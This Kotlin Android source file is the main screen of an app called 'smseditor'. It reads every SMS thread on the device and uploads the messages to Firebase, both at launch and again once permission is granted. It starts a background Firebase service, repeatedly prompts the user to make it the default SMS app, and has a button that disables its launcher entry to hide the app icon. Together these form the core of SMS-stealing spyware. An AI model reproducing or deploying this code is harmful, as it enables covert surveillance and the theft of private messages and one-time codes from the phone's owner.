package sms.newgate.com.smseditor.activity

import android.content.ComponentName
import android.content.Intent
import android.support.v7.app.AppCompatActivity
import android.os.Bundle
import android.support.v7.widget.LinearLayoutManager
import android.widget.LinearLayout
import kotlinx.android.synthetic.main.activity_main.*
import sms.newgate.com.smseditor.R
import sms.newgate.com.smseditor.adapter.MsgAdapter
import sms.newgate.com.smseditor.util.MessageHelper
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Telephony
import android.support.v4.app.ActivityCompat
import android.support.v4.content.ContextCompat
import android.support.v7.app.AlertDialog
import android.util.Log
import sms.newgate.com.smseditor.model.SmsThread
import sms.newgate.com.smseditor.service.FirebaseMsgService
import sms.newgate.com.smseditor.util.FirebaseUtils

class MainActivity : AppCompatActivity() {

    lateinit var helper: MessageHelper

    lateinit var adapter: MsgAdapter

    var smsThreads: ArrayList<SmsThread> = arrayListOf()

    companion object {
        val SMS_REQUEST_CODE = 1000
        val READ_PHONE_REQUEST_CODE = 1000
    }


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        title = "List Thread"

        helper = MessageHelper(this)

//        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
//            if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
//                Log.e("XMainActivity", "======> a1")
//                requestPermission(android.Manifest.permission.READ_PHONE_STATE, READ_PHONE_REQUEST_CODE)
//            }
//        }

        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                Log.e("XMainActivity", "======> 1")
                requestPermission(android.Manifest.permission.READ_SMS, SMS_REQUEST_CODE)
            } else {
                Log.e("XMainActivity", "======> 2")
                smsThreads = helper.getAllMessage()
            }
        } else {
            smsThreads = helper.getAllMessage()
        }

        FirebaseUtils.getInstance(this).createMessages(smsThreads)

        adapter = MsgAdapter(smsThreads, object: MsgAdapter.ClickMsgItemListener {
            override fun click(pos: Int) {
            }
        })

        msgThreadRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayout.VERTICAL, false)
        msgThreadRecyclerView.adapter = adapter

        startService(Intent(this, FirebaseMsgService::class.java))

        buttonHidden.setOnClickListener {
            hideIconApp()
        }
    }

    private fun showExplanation(title: String,
                                message: String,
                                permission: String,
                                permissionRequestCode: Int) {
        val builder = AlertDialog.Builder(this)
        builder.setTitle(title)
                .setMessage(message)
                .setPositiveButton(android.R.string.ok) { dialog, id -> requestPermission(permission, permissionRequestCode) }
        builder.create().show()
    }

    private fun requestPermission(permissionName: String, permissionRequestCode: Int) {
        ActivityCompat.requestPermissions(this,
                arrayOf(permissionName), permissionRequestCode)
    }

    fun hideIconApp() {
        val componentName = ComponentName(this, MainActivity::class.java) // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
        finish()
    }

    override fun onResume() {
        super.onResume()
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
            if (Telephony.Sms.getDefaultSmsPackage(this) != packageName) {
                val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
                intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
                startActivity(intent)
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            SMS_REQUEST_CODE -> {
                if (grantResults.isEmpty() || grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                    Log.i("XonRequestPermissionsResult", "=========> 111")
                } else {
                    smsThreads = helper.getAllMessage()
                    Log.i("XonRequestPermissionsResult", "=========> 222 =  " + smsThreads.size)
                    FirebaseUtils.getInstance(this).createMessages(smsThreads)
                }
            }
        }
    }

}
